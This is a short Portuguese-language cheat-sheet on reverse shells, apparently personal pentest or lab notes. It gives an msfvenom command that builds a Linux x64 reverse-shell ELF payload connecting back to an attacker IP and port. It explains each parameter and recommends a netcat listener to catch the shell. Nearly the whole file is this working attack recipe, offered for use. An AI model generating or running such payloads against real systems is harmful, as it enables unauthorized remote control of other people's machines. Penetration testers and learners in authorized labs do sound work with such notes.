# Reverse Shells

Este arquivo contém comandos úteis para criação e configuração de reverse shells em diferentes plataformas e linguagens.

## Linux Reverse Shell - ELF Payload

O comando abaixo usa `msfvenom` para gerar um payload de reverse shell no formato ELF, específico para sistemas Linux de 64 bits:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.118.11 LPORT=4444 -f elf -o shell
```

### Descrição dos Parâmetros

- `-p linux/x64/shell_reverse_tcp`: Define o payload como uma shell reversa para Linux 64 bits.
- `LHOST=192.168.118.11`: Define o IP do atacante para onde o shell reverso irá se conectar.
- `LPORT=4444`: Define a porta no IP do atacante para a conexão reversa.
- `-f elf`: Especifica o formato de saída do arquivo como ELF, compatível com sistemas Linux.
- `-o shell`: Nomeia o arquivo gerado como `shell`.

**Nota**: Esse payload deve ser configurado em conjunto com um listener no IP e porta especificados (como `nc -lvp 4444`) para capturar a conexão reversa.
